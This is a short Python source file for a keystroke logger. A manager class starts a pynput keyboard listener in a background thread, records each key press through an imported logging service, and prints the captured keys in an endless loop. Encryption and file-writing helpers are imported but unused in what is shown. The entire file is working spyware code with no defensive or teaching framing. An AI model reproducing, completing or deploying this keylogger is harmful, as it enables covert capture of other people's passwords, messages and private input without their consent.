from service import KeyLoggerService,FileWriter,Encryptor
from pynput.keyboard import Listener
import threading

class KeyLoggerManager:
    def __init__(self):
        self.__key_logger = KeyLoggerService()
        self.__writer = FileWriter()
        self.__encryptor = Encryptor()
        self.__is_logging = False
        self.__logger_thread = threading.Thread(target=self.__listen)


    def start_logging(self):
        self.__is_logging = True
        self.__logger_thread.start()

    def stop_logging(self):
        self.__is_logging = False

    def __listen(self):
        with Listener(on_press=self.__key_logger.on_press) as listener:
            listener.join()

    def print_keys(self):
        logged_keys = self.__key_logger.get_logged_keys()
        self.__key_logger.clear_logged_keys()
        for key, value in logged_keys.items():
            print(key)
            print(value)

x = KeyLoggerManager()
x.start_logging()
while True:
    # time.sleep(1)
    x.print_keys()